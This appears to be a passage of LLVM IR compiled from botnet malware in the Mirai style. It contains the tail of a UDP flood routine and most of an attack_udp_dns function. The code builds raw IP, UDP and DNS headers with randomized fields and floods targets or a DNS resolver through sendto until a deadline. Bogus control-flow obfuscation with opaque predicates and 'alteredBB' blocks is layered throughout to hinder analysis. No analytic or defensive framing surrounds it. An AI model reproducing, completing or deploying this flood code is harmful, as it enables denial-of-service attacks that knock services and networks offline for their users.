  br i1 %274, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %266
  %275 = load i16, i16* %15, align 2
  %276 = zext i16 %275 to i32
  %277 = icmp eq i32 %276, 65535
  %278 = load i32, i32* @x.31
  %279 = load i32, i32* @y.32
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %277, label %286, label %291

; <label>:286:                                    ; preds = %originalBBpart212
  %287 = call i32 @rand_next()
  %288 = trunc i32 %287 to i16
  %289 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 3
  store i16 %288, i16* %290, align 4
  br label %291

; <label>:291:                                    ; preds = %286, %originalBBpart212
  %292 = load i16, i16* %18, align 2
  %293 = zext i16 %292 to i32
  %294 = icmp eq i32 %293, 65535
  br i1 %294, label %295, label %300

; <label>:295:                                    ; preds = %291
  %296 = call i32 @rand_next()
  %297 = trunc i32 %296 to i16
  %298 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 0
  store i16 %297, i16* %299, align 2
  br label %300

; <label>:300:                                    ; preds = %295, %291
  %301 = load i16, i16* %19, align 2
  %302 = zext i16 %301 to i32
  %303 = icmp eq i32 %302, 65535
  br i1 %303, label %304, label %309

; <label>:304:                                    ; preds = %300
  %305 = call i32 @rand_next()
  %306 = trunc i32 %305 to i16
  %307 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %308 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %307, i32 0, i32 1
  store i16 %306, i16* %308, align 2
  br label %309

; <label>:309:                                    ; preds = %304, %300
  %310 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 7
  store i16 0, i16* %311, align 2
  %312 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %313 = bitcast %struct.iphdr* %312 to i16*
  %314 = call zeroext i16 @checksum_generic(i16* %313, i32 20)
  %315 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %316 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %315, i32 0, i32 7
  store i16 %314, i16* %316, align 2
  %317 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %318 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %317, i32 0, i32 3
  store i16 0, i16* %318, align 2
  %319 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %320 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %321 = bitcast %struct.udphdr* %320 to i8*
  %322 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 2
  %324 = load i16, i16* %323, align 2
  %325 = load i32, i32* %21, align 4
  %326 = sext i32 %325 to i64
  %327 = add i64 12, %326
  %328 = trunc i64 %327 to i32
  %329 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %319, i8* %321, i16 zeroext %324, i32 %328)
  %330 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 3
  store i16 %329, i16* %331, align 2
  %332 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 1
  %334 = load i16, i16* %333, align 2
  %335 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %336 = load i32, i32* %11, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %335, i64 %337
  %339 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %338, i32 0, i32 0
  %340 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %339, i32 0, i32 1
  store i16 %334, i16* %340, align 2
  %341 = load i32, i32* %12, align 4
  %342 = load i8*, i8** %26, align 8
  %343 = load i32, i32* %21, align 4
  %344 = sext i32 %343 to i64
  %345 = add i64 32, %344
  %346 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %347 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %348 = load i32, i32* %11, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i32 0, i32 0
  %352 = bitcast %struct.sockaddr_in* %351 to %struct.sockaddr*
  store %struct.sockaddr* %352, %struct.sockaddr** %346, align 8
  %353 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %354 = load %struct.sockaddr*, %struct.sockaddr** %353, align 8
  %355 = call i64 @sendto(i32 %341, i8* %342, i64 %345, i32 16384, %struct.sockaddr* %354, i32 16)
  br label %356

; <label>:356:                                    ; preds = %309
  %357 = load i32, i32* %11, align 4
  %358 = add nsw i32 %357, 1
  store i32 %358, i32* %11, align 4
  br label %221

; <label>:359:                                    ; preds = %221
  %360 = call i64 @time(i64* null) #6
  %361 = load i32, i32* %22, align 4
  %362 = sext i32 %361 to i64
  %363 = icmp sgt i64 %360, %362
  br i1 %363, label %364, label %365

; <label>:364:                                    ; preds = %359
  br label %382

; <label>:365:                                    ; preds = %359
  %366 = load i32, i32* @x.31
  %367 = load i32, i32* @y.32
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %365
  %374 = load i32, i32* @x.31
  %375 = load i32, i32* @y.32
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %220

; <label>:382:                                    ; preds = %364, %72, %66
  %383 = load i32, i32* @x.31
  %384 = load i32, i32* @y.32
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %382
  %391 = load i32, i32* @x.31
  %392 = load i32, i32* @y.32
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %75
  store i32 0, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %92
  %399 = load i32, i32* %11, align 4
  %400 = load i8, i8* %7, align 1
  %401 = zext i8 %400 to i32
  %402 = icmp slt i32 %399, %401
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %160
  %403 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %404 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 4
  store i16 %403, i16* %405, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %266
  %406 = load i16, i16* %15, align 2
  %407 = zext i16 %406 to i32
  %408 = icmp eq i32 %407, 65535
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %365
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %382
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.33
  %7 = load i32, i32* @y.34
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8**, align 8
  %22 = alloca i8, align 1
  %23 = alloca i16, align 2
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i16, align 2
  %27 = alloca i16, align 2
  %28 = alloca i16, align 2
  %29 = alloca i8, align 1
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8, align 1
  %36 = alloca i8, align 1
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca %struct.dnshdr*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca %struct.grehdr*, align 8
  %43 = alloca i8*, align 8
  %44 = alloca %struct.iphdr*, align 8
  %45 = alloca %struct.udphdr*, align 8
  %46 = alloca %struct.dnshdr*, align 8
  %47 = alloca i8*, align 8
  %48 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %49 = load i8, i8* %15, align 1
  %50 = zext i8 %49 to i64
  %51 = call noalias i8* @calloc(i64 %50, i64 8) #6
  %52 = bitcast i8* %51 to i8**
  store i8** %52, i8*** %21, align 8
  %53 = load i8, i8* %17, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 2, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %22, align 1
  %57 = load i8, i8* %17, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 3, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %23, align 2
  %61 = load i8, i8* %17, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 4, i32 64)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %24, align 1
  %65 = load i8, i8* %17, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 5, i32 0)
  %68 = trunc i32 %67 to i8
  store i8 %68, i8* %25, align 1
  %69 = load i8, i8* %17, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 6, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %26, align 2
  %73 = load i8, i8* %17, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 7, i32 53)
  %76 = trunc i32 %75 to i16
  store i16 %76, i16* %27, align 2
  %77 = load i8, i8* %17, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %79 = call i32 @attack_get_opt_int(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 9, i32 65535)
  %80 = trunc i32 %79 to i16
  store i16 %80, i16* %28, align 2
  %81 = load i8, i8* %17, align 1
  %82 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %83 = call i32 @attack_get_opt_int(i8 zeroext %81, %struct.attack_option* %82, i8 zeroext 0, i32 12)
  %84 = trunc i32 %83 to i8
  store i8 %84, i8* %29, align 1
  %85 = load i8, i8* %17, align 1
  %86 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %87 = call i8* @attack_get_opt_str(i8 zeroext %85, %struct.attack_option* %86, i8 zeroext 8, i8* null)
  store i8* %87, i8** %30, align 8
  store i32 0, i32* %31, align 4
  %88 = call i32 @get_dns_resolver()
  store i32 %88, i32* %32, align 4
  %89 = call i64 @time(i64* null) #6
  %90 = load i32, i32* %14, align 4
  %91 = sext i32 %90 to i64
  %92 = add nsw i64 %89, %91
  %93 = trunc i64 %92 to i32
  store i32 %93, i32* %33, align 4
  %94 = load i8*, i8** %30, align 8
  %95 = icmp eq i8* %94, null
  %96 = load i32, i32* @x.33
  %97 = load i32, i32* @y.34
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %95, label %104, label %121

; <label>:104:                                    ; preds = %originalBBpart2
  %105 = load i32, i32* @x.33
  %106 = load i32, i32* @y.34
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %104
  %113 = load i32, i32* @x.33
  %114 = load i32, i32* @y.34
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart27, label %originalBB5alteredBB

originalBBpart27:                                 ; preds = %originalBB5
  br label %606

; <label>:121:                                    ; preds = %originalBBpart2
  %122 = load i8*, i8** %30, align 8
  %123 = call i32 @util_strlen(i8* %122)
  store i32 %123, i32* %31, align 4
  %124 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %124, i32* %20, align 4
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %121
  br label %606

; <label>:127:                                    ; preds = %121
  %128 = load i32, i32* @x.33
  %129 = load i32, i32* @y.34
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %127
  store i32 1, i32* %19, align 4
  %136 = load i32, i32* %20, align 4
  %137 = bitcast i32* %19 to i8*
  %138 = call i32 @setsockopt(i32 %136, i32 0, i32 3, i8* %137, i32 4) #6
  %139 = icmp eq i32 %138, -1
  %140 = load i32, i32* @x.33
  %141 = load i32, i32* @y.34
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br i1 %139, label %148, label %151

; <label>:148:                                    ; preds = %originalBBpart211
  %149 = load i32, i32* %20, align 4
  %150 = call i32 @close(i32 %149)
  br label %606

; <label>:151:                                    ; preds = %originalBBpart211
  store i32 0, i32* %19, align 4
  br label %152

; <label>:152:                                    ; preds = %377, %151
  %153 = load i32, i32* @x.33
  %154 = load i32, i32* @y.34
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %152
  %161 = load i32, i32* %19, align 4
  %162 = load i8, i8* %15, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp slt i32 %161, %163
  %165 = load i32, i32* @x.33
  %166 = load i32, i32* @y.34
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %164, label %173, label %380

; <label>:173:                                    ; preds = %originalBBpart215
  store i32 0, i32* %34, align 4
  store i8 0, i8* %35, align 1
  store i8 0, i8* %36, align 1
  %174 = call noalias i8* @calloc(i64 600, i64 1) #6
  %175 = load i8**, i8*** %21, align 8
  %176 = load i32, i32* %19, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds i8*, i8** %175, i64 %177
  store i8* %174, i8** %178, align 8
  %179 = load i8**, i8*** %21, align 8
  %180 = load i32, i32* %19, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8*, i8** %179, i64 %181
  %183 = load i8*, i8** %182, align 8
  %184 = bitcast i8* %183 to %struct.iphdr*
  store %struct.iphdr* %184, %struct.iphdr** %37, align 8
  %185 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i64 1
  %187 = bitcast %struct.iphdr* %186 to %struct.udphdr*
  store %struct.udphdr* %187, %struct.udphdr** %38, align 8
  %188 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i64 1
  %190 = bitcast %struct.udphdr* %189 to %struct.dnshdr*
  store %struct.dnshdr* %190, %struct.dnshdr** %39, align 8
  %191 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %192 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %191, i64 1
  %193 = bitcast %struct.dnshdr* %192 to i8*
  store i8* %193, i8** %40, align 8
  %194 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %195 = bitcast %struct.iphdr* %194 to i8*
  %196 = load i8, i8* %195, align 4
  %197 = and i8 %196, 15
  %198 = or i8 %197, 64
  store i8 %198, i8* %195, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %200 = bitcast %struct.iphdr* %199 to i8*
  %201 = load i8, i8* %200, align 4
  %202 = and i8 %201, -16
  %203 = or i8 %202, 5
  store i8 %203, i8* %200, align 4
  %204 = load i8, i8* %22, align 1
  %205 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 1
  store i8 %204, i8* %206, align 1
  %207 = load i8, i8* %29, align 1
  %208 = zext i8 %207 to i64
  %209 = add i64 41, %208
  %210 = add i64 %209, 2
  %211 = load i32, i32* %31, align 4
  %212 = sext i32 %211 to i64
  %213 = add i64 %210, %212
  %214 = add i64 %213, 4
  %215 = trunc i64 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 2
  store i16 %216, i16* %218, align 2
  %219 = load i16, i16* %23, align 2
  %220 = call zeroext i16 @htons(i16 zeroext %219) #7
  %221 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 3
  store i16 %220, i16* %222, align 4
  %223 = load i8, i8* %24, align 1
  %224 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 5
  store i8 %223, i8* %225, align 4
  %226 = load i8, i8* %25, align 1
  %227 = icmp ne i8 %226, 0
  br i1 %227, label %228, label %232

; <label>:228:                                    ; preds = %173
  %229 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %230 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 4
  store i16 %229, i16* %231, align 2
  br label %232

; <label>:232:                                    ; preds = %228, %173
  %233 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 6
  store i8 17, i8* %234, align 1
  %235 = load i32, i32* @LOCAL_ADDR, align 4
  %236 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 8
  store i32 %235, i32* %237, align 4
  %238 = load i32, i32* %32, align 4
  %239 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 9
  store i32 %238, i32* %240, align 4
  %241 = load i16, i16* %26, align 2
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 0
  store i16 %242, i16* %244, align 2
  %245 = load i16, i16* %27, align 2
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 1
  store i16 %246, i16* %248, align 2
  %249 = load i8, i8* %29, align 1
  %250 = zext i8 %249 to i64
  %251 = add i64 21, %250
  %252 = add i64 %251, 2
  %253 = load i32, i32* %31, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 %252, %254
  %256 = add i64 %255, 4
  %257 = trunc i64 %256 to i16
  %258 = call zeroext i16 @htons(i16 zeroext %257) #7
  %259 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 2
  store i16 %258, i16* %260, align 2
  %261 = load i16, i16* %28, align 2
  %262 = call zeroext i16 @htons(i16 zeroext %261) #7
  %263 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %264 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %263, i32 0, i32 0
  store i16 %262, i16* %264, align 2
  %265 = call zeroext i16 @htons(i16 zeroext 256) #7
  %266 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %267 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %266, i32 0, i32 1
  store i16 %265, i16* %267, align 2
  %268 = call zeroext i16 @htons(i16 zeroext 1) #7
  %269 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %270 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %269, i32 0, i32 2
  store i16 %268, i16* %270, align 2
  %271 = load i8, i8* %29, align 1
  %272 = load i8*, i8** %40, align 8
  %273 = getelementptr inbounds i8, i8* %272, i32 1
  store i8* %273, i8** %40, align 8
  store i8 %271, i8* %272, align 1
  %274 = load i8, i8* %29, align 1
  %275 = zext i8 %274 to i32
  %276 = load i8*, i8** %40, align 8
  %277 = sext i32 %275 to i64
  %278 = getelementptr inbounds i8, i8* %276, i64 %277
  store i8* %278, i8** %40, align 8
  %279 = load i8*, i8** %40, align 8
  store i8* %279, i8** %41, align 8
  %280 = load i8*, i8** %40, align 8
  %281 = getelementptr inbounds i8, i8* %280, i64 1
  %282 = load i8*, i8** %30, align 8
  %283 = load i32, i32* %31, align 4
  %284 = add nsw i32 %283, 1
  call void @util_memcpy(i8* %281, i8* %282, i32 %284)
  store i32 0, i32* %34, align 4
  br label %285

; <label>:285:                                    ; preds = %originalBBpart231, %232
  %286 = load i32, i32* %34, align 4
  %287 = load i32, i32* %31, align 4
  %288 = icmp slt i32 %286, %287
  br i1 %288, label %289, label %346

; <label>:289:                                    ; preds = %285
  %290 = load i32, i32* @x.33
  %291 = load i32, i32* @y.34
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %289
  %298 = load i8*, i8** %30, align 8
  %299 = load i32, i32* %34, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds i8, i8* %298, i64 %300
  %302 = load i8, i8* %301, align 1
  %303 = sext i8 %302 to i32
  %304 = icmp eq i32 %303, 46
  %305 = load i32, i32* @x.33
  %306 = load i32, i32* @y.34
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %304, label %313, label %323

; <label>:313:                                    ; preds = %originalBBpart219
  %314 = load i8, i8* %35, align 1
  %315 = load i8*, i8** %41, align 8
  store i8 %314, i8* %315, align 1
  store i8 0, i8* %35, align 1
  %316 = load i8, i8* %36, align 1
  %317 = add i8 %316, 1
  store i8 %317, i8* %36, align 1
  %318 = load i8*, i8** %40, align 8
  %319 = load i32, i32* %34, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds i8, i8* %318, i64 %320
  %322 = getelementptr inbounds i8, i8* %321, i64 1
  store i8* %322, i8** %41, align 8
  br label %326

; <label>:323:                                    ; preds = %originalBBpart219
  %324 = load i8, i8* %35, align 1
  %325 = add i8 %324, 1
  store i8 %325, i8* %35, align 1
  br label %326

; <label>:326:                                    ; preds = %323, %313
  br label %327

; <label>:327:                                    ; preds = %326
  %328 = load i32, i32* @x.33
  %329 = load i32, i32* @y.34
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %327
  %336 = load i32, i32* %34, align 4
  %337 = add nsw i32 %336, 1
  store i32 %337, i32* %34, align 4
  %338 = load i32, i32* @x.33
  %339 = load i32, i32* @y.34
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart231, label %originalBB21alteredBB

originalBBpart231:                                ; preds = %originalBB21
  br label %285

; <label>:346:                                    ; preds = %285
  %347 = load i32, i32* @x.33
  %348 = load i32, i32* @y.34
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %346
  %355 = load i8, i8* %35, align 1
  %356 = load i8*, i8** %41, align 8
  store i8 %355, i8* %356, align 1
  %357 = load i8*, i8** %40, align 8
  %358 = load i32, i32* %31, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds i8, i8* %357, i64 %359
  %361 = getelementptr inbounds i8, i8* %360, i64 2
  %362 = bitcast i8* %361 to %struct.grehdr*
  store %struct.grehdr* %362, %struct.grehdr** %42, align 8
  %363 = call zeroext i16 @htons(i16 zeroext 1) #7
  %364 = load %struct.grehdr*, %struct.grehdr** %42, align 8
  %365 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %364, i32 0, i32 0
  store i16 %363, i16* %365, align 2
  %366 = call zeroext i16 @htons(i16 zeroext 1) #7
  %367 = load %struct.grehdr*, %struct.grehdr** %42, align 8
  %368 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %367, i32 0, i32 1
  store i16 %366, i16* %368, align 2
  %369 = load i32, i32* @x.33
  %370 = load i32, i32* @y.34
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %377

; <label>:377:                                    ; preds = %originalBBpart235
  %378 = load i32, i32* %19, align 4
  %379 = add nsw i32 %378, 1
  store i32 %379, i32* %19, align 4
  br label %152

; <label>:380:                                    ; preds = %originalBBpart215
  %381 = load i32, i32* @x.33
  %382 = load i32, i32* @y.34
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBB37, label %originalBB37alteredBB

